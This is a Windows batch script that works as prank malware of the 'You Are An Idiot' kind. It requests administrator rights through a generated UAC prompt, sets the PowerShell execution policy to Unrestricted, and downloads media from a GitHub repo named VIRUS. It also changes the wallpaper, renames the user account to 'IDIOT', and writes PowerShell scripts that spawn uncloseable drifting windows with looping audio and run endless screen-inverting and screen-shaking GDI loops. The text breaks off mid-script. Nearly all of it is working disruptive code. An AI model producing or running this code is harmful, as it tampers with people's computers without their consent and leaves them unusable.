@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
mkdir %appdata%\ren
del /s /q %appdata%\ren
cd %appdata%\ren
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/blob/main/youareanidiotthree.gif?raw=true" -outfile "maxwell.gif"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/raw/main/1m30s.mp3" -outfile "youareanidiot.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/raw/main/youareanidiot9.mp3" -outfile "alkdcoe.mp3"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/blob/main/youareanidiotone.gif?raw=true" -outfile "idiotbeat.gif"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/blob/main/idiotstupidhuman.gif?raw=true" -outfile "idiotdance.gif"
powershell -Command "Invoke-Webrequest" "https://github.com/uzokingkong/VIRUS/blob/main/idiotback.png?raw=true" -outfile "1.png"
REG ADD "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%appdata%\ren\1.png" /f
REG ADD "HKCU\Control Panel\Desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
REG ADD "HKCU\Control Panel\Desktop" /v TileWallpaper /t REG_SZ /d 0 /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
wmic useraccount where Name='%username%' set FullName='IDIOT'
net user %username% /fullname:"IDIOT"


echo Add-Type -AssemblyName System.Windows.Forms 																													> idiot3.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                    >> idiot3.ps1
echo using System;                                                                                                                                                  >> idiot3.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> idiot3.ps1
echo using System.Drawing;                                                                                                                                          >> idiot3.ps1
echo public class Win32 {                                                                                                                                           >> idiot3.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> idiot3.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                            >> idiot3.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> idiot3.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                                                           >> idiot3.ps1
echo     [DllImport("winmm.dll")]                                                                                                                                   >> idiot3.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                                                >> idiot3.ps1
echo }                                                                                                                                                              >> idiot3.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> idiot3.ps1
echo public struct MONITORINFO {                                                                                                                                    >> idiot3.ps1
echo     public int cbSize;                                                                                                                                         >> idiot3.ps1
echo     public RECT rcMonitor;                                                                                                                                     >> idiot3.ps1
echo     public RECT rcWork;                                                                                                                                        >> idiot3.ps1
echo     public int dwFlags;                                                                                                                                        >> idiot3.ps1
echo }                                                                                                                                                              >> idiot3.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> idiot3.ps1
echo public struct RECT {                                                                                                                                           >> idiot3.ps1
echo     public int Left;                                                                                                                                           >> idiot3.ps1
echo     public int Top;                                                                                                                                            >> idiot3.ps1
echo     public int Right;                                                                                                                                          >> idiot3.ps1
echo     public int Bottom;                                                                                                                                         >> idiot3.ps1
echo }                                                                                                                                                              >> idiot3.ps1
echo ^"@                                                                                                                                                             >> idiot3.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                                                   >> idiot3.ps1
echo $form.Text = "YOU ARE AN IDIOT"                                                                                                                                     >> idiot3.ps1
echo $form.ShowInTaskbar = $false >> idiot3.ps1
echo $form.Size = New-Object Drawing.Size(350, 350)                                                                                                                 >> idiot3.ps1
echo $form.ControlBox = $false                                                                                                                                      >> idiot3.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle >> idiot3.ps1
echo $form.StartPosition = "Manual"                                                                                                                                 >> idiot3.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                                                        >> idiot3.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                                                       >> idiot3.ps1
echo $pictureBox.Size = $form.Size                                                                                                                                  >> idiot3.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                                                         >> idiot3.ps1
echo $form.Controls.Add($pictureBox)                                                                                                                                >> idiot3.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\maxwell.gif"                                                                                                            >> idiot3.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                                              >> idiot3.ps1
echo $pictureBox.Image = $gif                                                                                                                                       >> idiot3.ps1
echo $mp3Path = Join-Path $env:APPDATA "ren\maxwell.mp3"                                                                                                            >> idiot3.ps1
echo [Win32]::mciSendString("open `"${mp3Path}`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)                                                               >> idiot3.ps1
echo [Win32]::mciSendString("play mp3 repeat", $null, 0, [IntPtr]::Zero)                                                                                            >> idiot3.ps1
echo $moveCounter = 0                                                                                                                                               >> idiot3.ps1
echo $mb = Get-Random -Minimum 1 -Maximum 1200 >> idiot3.ps1
echo $ma = Get-Random -Minimum 120 -Maximum 800 >> idiot3.ps1
echo $form.Location = New-Object System.Drawing.Point($mb, $ma) >> idiot3.ps1
echo $mya = Get-Random -Minimum -2 -Maximum 3 >> idiot3.ps1
echo $myb = Get-Random -Minimum -2 -Maximum 3 >> idiot3.ps1
echo function UpdateFormLocation() {                                                                                                                                >> idiot3.ps1
echo     $currentLocation = $form.Location                                                                                                                          >> idiot3.ps1
echo     $monitorInfo = New-Object MONITORINFO                                                                                                                      >> idiot3.ps1
echo     [Win32]::GetMonitorInfo([Win32]::GetDesktopWindow(), [ref]$monitorInfo) ^| Out-Null                                                                         >> idiot3.ps1
echo     $monitorRect = $monitorInfo.rcMonitor                                                                                                                      >> idiot3.ps1
echo     $formWidth = $form.Width                                                                                                                                   >> idiot3.ps1
echo     $formHeight = $form.Height                                                                                                                                 >> idiot3.ps1
echo     $newX = $currentLocation.X ^+ $mya                                                                                                                          >> idiot3.ps1
echo     $newY = $currentLocation.Y ^+ $myb                                                                                                                          >> idiot3.ps1
echo     $form.Location = New-Object System.Drawing.Point($newX, $newY)                                                                                             >> idiot3.ps1
echo }                                                                                                                                                              >> idiot3.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                                                 >> idiot3.ps1
echo $timer.Interval = 60                                                                                                                                           >> idiot3.ps1
echo $timer.Add_Tick({                                                                                                                                              >> idiot3.ps1
echo     if ($moveCounter -eq 0) {                                                                                                                                  >> idiot3.ps1
echo         UpdateFormLocation                                                                                                                                     >> idiot3.ps1
echo     } else {                                                                                                                                                   >> idiot3.ps1
echo         $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 1 -Maximum 101), (Get-Random -Minimum 1 -Maximum 201))                           >> idiot3.ps1
echo         $moveCounter ^-= 1                                                                                                                                      >> idiot3.ps1
echo     }                                                                                                                                                          >> idiot3.ps1
echo })                                                                                                                                                             >> idiot3.ps1
echo $timer.Start() >> idiot3.ps1
echo $form.ShowDialog()                                                                                                                                             >> idiot3.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                                                  >> idiot3.ps1

echo Add-Type -AssemblyName System.Windows.Forms 																													> idiotbeat.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                    >> idiotbeat.ps1
echo using System;                                                                                                                                                  >> idiotbeat.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> idiotbeat.ps1
echo using System.Drawing;                                                                                                                                          >> idiotbeat.ps1
echo public class Win32 {                                                                                                                                           >> idiotbeat.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> idiotbeat.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                            >> idiotbeat.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> idiotbeat.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                                                           >> idiotbeat.ps1
echo     [DllImport("winmm.dll")]                                                                                                                                   >> idiotbeat.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                                                >> idiotbeat.ps1
echo }                                                                                                                                                              >> idiotbeat.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> idiotbeat.ps1
echo public struct MONITORINFO {                                                                                                                                    >> idiotbeat.ps1
echo     public int cbSize;                                                                                                                                         >> idiotbeat.ps1
echo     public RECT rcMonitor;                                                                                                                                     >> idiotbeat.ps1
echo     public RECT rcWork;                                                                                                                                        >> idiotbeat.ps1
echo     public int dwFlags;                                                                                                                                        >> idiotbeat.ps1
echo }                                                                                                                                                              >> idiotbeat.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> idiotbeat.ps1
echo public struct RECT {                                                                                                                                           >> idiotbeat.ps1
echo     public int Left;                                                                                                                                           >> idiotbeat.ps1
echo     public int Top;                                                                                                                                            >> idiotbeat.ps1
echo     public int Right;                                                                                                                                          >> idiotbeat.ps1
echo     public int Bottom;                                                                                                                                         >> idiotbeat.ps1
echo }                                                                                                                                                              >> idiotbeat.ps1
echo ^"@                                                                                                                                                             >> idiotbeat.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                                                   >> idiotbeat.ps1
echo $form.Text = "YOU ARE AN IDIOT"                                                                                                                                     >> idiotbeat.ps1
echo $form.ShowInTaskbar = $false >> idiotbeat.ps1
echo $form.Size = New-Object Drawing.Size(250, 250)                                                                                                                  >> idiotbeat.ps1
echo $form.ControlBox = $false                                                                                                                                      >> idiotbeat.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle >> idiotbeat.ps1
echo $form.StartPosition = "Manual"                                                                                                                                 >> idiotbeat.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                                                        >> idiotbeat.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                                                       >> idiotbeat.ps1
echo $pictureBox.Size = $form.Size                                                                                                                                  >> idiotbeat.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                                                         >> idiotbeat.ps1
echo $form.Controls.Add($pictureBox)                                                                                                                                >> idiotbeat.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\idiotbeat.gif"                                                                                                            >> idiotbeat.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                                              >> idiotbeat.ps1
echo $pictureBox.Image = $gif                                                                                                                                       >> idiotbeat.ps1
echo $mp3Path = Join-Path $env:APPDATA "ren\maxwell.mp3"                                                                                                            >> idiotbeat.ps1
echo [Win32]::mciSendString("open `"${mp3Path}`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)                                                               >> idiotbeat.ps1
echo [Win32]::mciSendString("play mp3 repeat", $null, 0, [IntPtr]::Zero)                                                                                            >> idiotbeat.ps1
echo $moveCounter = 0                                                                                                                                               >> idiotbeat.ps1
echo $mb = Get-Random -Minimum 1 -Maximum 1200 >> idiotbeat.ps1
echo $ma = Get-Random -Minimum 120 -Maximum 800 >> idiotbeat.ps1
echo $form.Location = New-Object System.Drawing.Point($mb, $ma) >> idiotbeat.ps1
echo $mya = Get-Random -Minimum -4 -Maximum 4 >> idiotbeat.ps1
echo $myb = Get-Random -Minimum -4 -Maximum 4 >> idiotbeat.ps1
echo function UpdateFormLocation() {                                                                                                                                >> idiotbeat.ps1
echo     $currentLocation = $form.Location                                                                                                                          >> idiotbeat.ps1
echo     $monitorInfo = New-Object MONITORINFO                                                                                                                      >> idiotbeat.ps1
echo     [Win32]::GetMonitorInfo([Win32]::GetDesktopWindow(), [ref]$monitorInfo) ^| Out-Null                                                                         >> idiotbeat.ps1
echo     $monitorRect = $monitorInfo.rcMonitor                                                                                                                      >> idiotbeat.ps1
echo     $formWidth = $form.Width                                                                                                                                   >> idiotbeat.ps1
echo     $formHeight = $form.Height                                                                                                                                 >> idiotbeat.ps1
echo     $newX = $currentLocation.X ^+ $mya                                                                                                                          >> idiotbeat.ps1
echo     $newY = $currentLocation.Y ^+ $myb                                                                                                                          >> idiotbeat.ps1
echo     $form.Location = New-Object System.Drawing.Point($newX, $newY)                                                                                             >> idiotbeat.ps1
echo }                                                                                                                                                              >> idiotbeat.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                                                 >> idiotbeat.ps1
echo $timer.Interval = 60                                                                                                                                           >> idiotbeat.ps1
echo $timer.Add_Tick({                                                                                                                                              >> idiotbeat.ps1
echo     if ($moveCounter -eq 0) {                                                                                                                                  >> idiotbeat.ps1
echo         UpdateFormLocation                                                                                                                                     >> idiotbeat.ps1
echo     } else {                                                                                                                                                   >> idiotbeat.ps1
echo         $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 1 -Maximum 101), (Get-Random -Minimum 1 -Maximum 201))                           >> idiotbeat.ps1
echo         $moveCounter ^-= 1                                                                                                                                      >> idiotbeat.ps1
echo     }                                                                                                                                                          >> idiotbeat.ps1
echo })                                                                                                                                                             >> idiotbeat.ps1
echo $timer.Start() >> idiotbeat.ps1
echo $form.ShowDialog()                                                                                                                                             >> idiotbeat.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                                                  >> idiotbeat.ps1

echo Add-Type -AssemblyName System.Windows.Forms 																													> idiotdance.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                    >> idiotdance.ps1
echo using System;                                                                                                                                                  >> idiotdance.ps1
echo using System.Runtime.InteropServices;                                                                                                                          >> idiotdance.ps1
echo using System.Drawing;                                                                                                                                          >> idiotdance.ps1
echo public class Win32 {                                                                                                                                           >> idiotdance.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> idiotdance.ps1
echo     public static extern IntPtr GetDesktopWindow();                                                                                                            >> idiotdance.ps1
echo     [DllImport("user32.dll")]                                                                                                                                  >> idiotdance.ps1
echo     public static extern bool GetMonitorInfo(IntPtr hMonitor, ref MONITORINFO lpmi);                                                                           >> idiotdance.ps1
echo     [DllImport("winmm.dll")]                                                                                                                                   >> idiotdance.ps1
echo     public static extern int mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);                                                >> idiotdance.ps1
echo }                                                                                                                                                              >> idiotdance.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> idiotdance.ps1
echo public struct MONITORINFO {                                                                                                                                    >> idiotdance.ps1
echo     public int cbSize;                                                                                                                                         >> idiotdance.ps1
echo     public RECT rcMonitor;                                                                                                                                     >> idiotdance.ps1
echo     public RECT rcWork;                                                                                                                                        >> idiotdance.ps1
echo     public int dwFlags;                                                                                                                                        >> idiotdance.ps1
echo }                                                                                                                                                              >> idiotdance.ps1
echo [StructLayout(LayoutKind.Sequential)]                                                                                                                          >> idiotdance.ps1
echo public struct RECT {                                                                                                                                           >> idiotdance.ps1
echo     public int Left;                                                                                                                                           >> idiotdance.ps1
echo     public int Top;                                                                                                                                            >> idiotdance.ps1
echo     public int Right;                                                                                                                                          >> idiotdance.ps1
echo     public int Bottom;                                                                                                                                         >> idiotdance.ps1
echo }                                                                                                                                                              >> idiotdance.ps1
echo ^"@                                                                                                                                                             >> idiotdance.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                                                                   >> idiotdance.ps1
echo $form.Text = "YOU ARE AN IDIOT"                                                                                                                                     >> idiotdance.ps1
echo $form.ShowInTaskbar = $false >> idiotdance.ps1
echo $form.Size = New-Object Drawing.Size(450, 450)                                                                                                                   >> idiotdance.ps1
echo $form.ControlBox = $false                                                                                                                                      >> idiotdance.ps1
echo $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedSingle >> idiotdance.ps1
echo $form.StartPosition = "Manual"                                                                                                                                 >> idiotdance.ps1
echo $form.Location = [Drawing.Point]::Empty                                                                                                                        >> idiotdance.ps1
echo $pictureBox = New-Object System.Windows.Forms.PictureBox                                                                                                       >> idiotdance.ps1
echo $pictureBox.Size = $form.Size                                                                                                                                  >> idiotdance.ps1
echo $pictureBox.SizeMode = [System.Windows.Forms.PictureBoxSizeMode]::Zoom                                                                                         >> idiotdance.ps1
echo $form.Controls.Add($pictureBox)                                                                                                                                >> idiotdance.ps1
echo $gifPath = Join-Path $env:APPDATA "ren\idiotdance.gif"                                                                                                            >> idiotdance.ps1
echo $gif = [System.Drawing.Image]::FromFile($gifPath)                                                                                                              >> idiotdance.ps1
echo $pictureBox.Image = $gif                                                                                                                                       >> idiotdance.ps1
echo $mp3Path = Join-Path $env:APPDATA "ren\maxwell.mp3"                                                                                                            >> idiotdance.ps1
echo [Win32]::mciSendString("open `"${mp3Path}`" type mpegvideo alias mp3", $null, 0, [IntPtr]::Zero)                                                               >> idiotdance.ps1
echo [Win32]::mciSendString("play mp3 repeat", $null, 0, [IntPtr]::Zero)                                                                                            >> idiotdance.ps1
echo $moveCounter = 0                                                                                                                                               >> idiotdance.ps1
echo $mb = Get-Random -Minimum 1 -Maximum 1200 >> idiotdance.ps1
echo $ma = Get-Random -Minimum 120 -Maximum 800 >> idiotdance.ps1
echo $form.Location = New-Object System.Drawing.Point($mb, $ma) >> idiotdance.ps1
echo $mya = Get-Random -Minimum -2 -Maximum 3 >> idiotdance.ps1
echo $myb = Get-Random -Minimum -2 -Maximum 3 >> idiotdance.ps1
echo function UpdateFormLocation() {                                                                                                                                >> idiotdance.ps1
echo     $currentLocation = $form.Location                                                                                                                          >> idiotdance.ps1
echo     $monitorInfo = New-Object MONITORINFO                                                                                                                      >> idiotdance.ps1
echo     [Win32]::GetMonitorInfo([Win32]::GetDesktopWindow(), [ref]$monitorInfo) ^| Out-Null                                                                         >> idiotdance.ps1
echo     $monitorRect = $monitorInfo.rcMonitor                                                                                                                      >> idiotdance.ps1
echo     $formWidth = $form.Width                                                                                                                                   >> idiotdance.ps1
echo     $formHeight = $form.Height                                                                                                                                 >> idiotdance.ps1
echo     $newX = $currentLocation.X ^+ $mya                                                                                                                          >> idiotdance.ps1
echo     $newY = $currentLocation.Y ^+ $myb                                                                                                                          >> idiotdance.ps1
echo     $form.Location = New-Object System.Drawing.Point($newX, $newY)                                                                                             >> idiotdance.ps1
echo }                                                                                                                                                              >> idiotdance.ps1
echo $timer = New-Object System.Windows.Forms.Timer                                                                                                                 >> idiotdance.ps1
echo $timer.Interval = 60                                                                                                                                           >> idiotdance.ps1
echo $timer.Add_Tick({                                                                                                                                              >> idiotdance.ps1
echo     if ($moveCounter -eq 0) {                                                                                                                                  >> idiotdance.ps1
echo         UpdateFormLocation                                                                                                                                     >> idiotdance.ps1
echo     } else {                                                                                                                                                   >> idiotdance.ps1
echo         $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 1 -Maximum 101), (Get-Random -Minimum 1 -Maximum 201))                           >> idiotdance.ps1
echo         $moveCounter ^-= 1                                                                                                                                      >> idiotdance.ps1
echo     }                                                                                                                                                          >> idiotdance.ps1
echo })                                                                                                                                                             >> idiotdance.ps1
echo $timer.Start() >> idiotdance.ps1
echo $form.ShowDialog()                                                                                                                                             >> idiotdance.ps1
echo [Win32]::mciSendString("close mp3", $null, 0, [IntPtr]::Zero)                                                                                                  >> idiotdance.ps1




echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben.ps1
echo $form.Opacity = 0                                                                                                    >> benben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\youareanidiot.mp3")                                                                     >> benben.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben.ps1
echo $host.Child = $mediaElement                                                                                          >> benben.ps1
echo $form.Controls.Add($host)                                                                                            >> benben.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben.ps1
echo while ($true) {                                                                                                      >> benben.ps1           
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> benben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> benben.ps1
echo         $mediaPlayer.Play()                                                                                          >> benben.ps1
echo     }                                                                                                                >> benben.ps1
echo }                                                                                                                    >> benben.ps1

echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> ben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> ben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> ben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> ben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> ben.ps1
echo $form.Opacity = 0                                                                                                    >> ben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> ben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\alkdcoe.mp3")                                                                     >> ben.ps1
echo $mediaPlayer.Play()                                                                                                  >> ben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> ben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> ben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> ben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> ben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> ben.ps1
echo $host.Child = $mediaElement                                                                                          >> ben.ps1
echo $form.Controls.Add($host)                                                                                            >> ben.ps1
echo $null = $form.ShowDialog()                                                                                           >> ben.ps1
echo while ($true) {                                                                                                      >> ben.ps1           
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> ben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> ben.ps1
echo         $mediaPlayer.Play()                                                                                          >> ben.ps1
echo     }                                                                                                                >> ben.ps1
echo }                                                                                                                    >> ben.ps1

echo Add-Type -TypeDefinition @^"																									> screanmove.ps1
echo using System;                                                                                                                  >> screanmove.ps1
echo using System.Runtime.InteropServices;                                                                                          >> screanmove.ps1
echo public class Program                                                                                                           >> screanmove.ps1
echo {                                                                                                                              >> screanmove.ps1
echo     [DllImport("user32.dll")]                                                                                                  >> screanmove.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                            >> screanmove.ps1
echo     [DllImport("user32.dll")]                                                                                                  >> screanmove.ps1
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);                                                               >> screanmove.ps1
echo     [DllImport("gdi32.dll")]                                                                                                   >> screanmove.ps1
echo     public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);                 >> screanmove.ps1
echo     [DllImport("user32.dll")]                                                                                                  >> screanmove.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                     >> screanmove.ps1
echo     public static void Main()                                                                                                  >> screanmove.ps1
echo     {                                                                                                                          >> screanmove.ps1
echo         IntPtr hdc = GetDC(IntPtr.Zero);                                                                                       >> screanmove.ps1
echo         int x = GetSystemMetrics(0);                                                                                           >> screanmove.ps1
echo         int y = GetSystemMetrics(1);                                                                                           >> screanmove.ps1
echo         while (true)                                                                                                           >> screanmove.ps1
echo         {                                                                                                                      >> screanmove.ps1
echo             hdc = GetDC(IntPtr.Zero);                                                                                          >> screanmove.ps1
echo             PatBlt(hdc, 0, 0, x, y, 0x005A0049);                                                                               >> screanmove.ps1
echo             System.Threading.Thread.Sleep(1);                                                                                  >> screanmove.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                       >> screanmove.ps1
echo         }                                                                                                                      >> screanmove.ps1
echo     }                                                                                                                          >> screanmove.ps1
echo }                                                                                                                              >> screanmove.ps1
echo ^"@                                                                                                                            >> screanmove.ps1
echo [Program]::Main()                                                                                                >> screanmove.ps1


echo Add-Type -TypeDefinition @^"								> light.ps1																					>> light.ps1
echo using System;                                                                                                                                  >> light.ps1
echo using System.Runtime.InteropServices;                                                                                                          >> light.ps1
echo public class ScreenShaker                                                                                                                      >> light.ps1
echo {                                                                                                                                              >> light.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> light.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                            >> light.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> light.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                               >> light.ps1
echo     [DllImport("user32.dll")]                                                                                                                  >> light.ps1
echo     public static extern int GetSystemMetrics(int nIndex);                                                                                     >> light.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                   >> light.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest,                  >> light.ps1
echo         IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, int dwRop);                                            >> light.ps1
echo     [DllImport("kernel32.dll")]                                                                                                                >> light.ps1
echo     public static extern void Sleep(int milliseconds);                                                                                         >> light.ps1
echo     public const int SRCCOPY = 0x00CC0020;                                                                                                     >> light.ps1
echo     public static void ShakeScreen()                                                                                                           >> light.ps1
echo     {                                                                                                                                          >> light.ps1
echo         IntPtr desk;                                                                                                                           >> light.ps1
echo         int sw, sh;                                                                                                                            >> light.ps1
echo         while (true)                                                                                                                           >> light.ps1
echo         {                                                                                                                                      >> light.ps1
echo             desk = GetDC(IntPtr.Zero);                                                                                                         >> light.ps1
echo             sw = GetSystemMetrics(0);                                                                                                          >> light.ps1
echo             sh = GetSystemMetrics(1);                                                                                                          >> light.ps1
echo             StretchBlt(desk, -2, -2, sw + 4, sh + 4, desk, 0, 0, sw, sh, SRCCOPY);                                                             >> light.ps1
echo             ReleaseDC(IntPtr.Zero, desk);                                                                                                      >> light.ps1
echo             Sleep(30);                                                                                                                         >> light.ps1
echo         }                                                                                                                                      >> light.ps1
echo     }                                                                                                                                          >> light.ps1
echo }                                                                                                                                              >> light.ps1
echo ^"@                                                                                                                                            >> light.ps1
echo [ScreenShaker]::ShakeScreen()                                                                                                                  >> light.ps1
	                                                                                                                 
echo Add-Type -TypeDefinition @^"																														> rainbow.ps1																										
echo using System;	                                                                                                                                    >> rainbow.ps1
echo using System.Runtime.InteropServices;                                                                                                              >> rainbow.ps1
echo public class PatBlt3                                                                                                                               >> rainbow.ps1
echo {                                                                                                                                                  >> rainbow.ps1
echo     [DllImport("user32.dll")]                                                                                                                      >> rainbow.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                >> rainbow.ps1
echo     [DllImport("user32.dll")]                                                                                                                      >> rainbow.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                   >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                       >> rainbow.ps1
echo     public static extern IntPtr CreateSolidBrush(uint color);                                                                                      >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                       >> rainbow.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);                                                                          >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                       >> rainbow.ps1
echo     public static extern int PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);                                      >> rainbow.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                       >> rainbow.ps1
echo     public static extern int DeleteObject(IntPtr hObject);                                                                                         >> rainbow.ps1
echo     public static void RunPatBlt3()                                                                                                                >> rainbow.ps1
echo     {                                                                                                                                              >> rainbow.ps1
echo         Random rand = new Random();                                                                                                                >> rainbow.ps1
echo         while (true)                                                                                                                               >> rainbow.ps1
echo         {                                                                                                                                          >> rainbow.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                       >> rainbow.ps1
echo             int w = (int)GetSystemMetrics(0);                                                                                                      >> rainbow.ps1
echo             int h = (int)GetSystemMetrics(1);                                                                                                      >> rainbow.ps1
echo             IntPtr brush = CreateSolidBrush((uint)(rand.Next() %% 155 ^| (rand.Next() %% 155) ^<^< 8 ^| (rand.Next() %% 155) ^<^< 16));            >> rainbow.ps1
echo             SelectObject(hdc, brush);                                                                                                              >> rainbow.ps1
echo             PatBlt(hdc, 0, 0, w, h, 0x005A0049);                                                                                                   >> rainbow.ps1
echo             DeleteObject(brush);                                                                                                                   >> rainbow.ps1
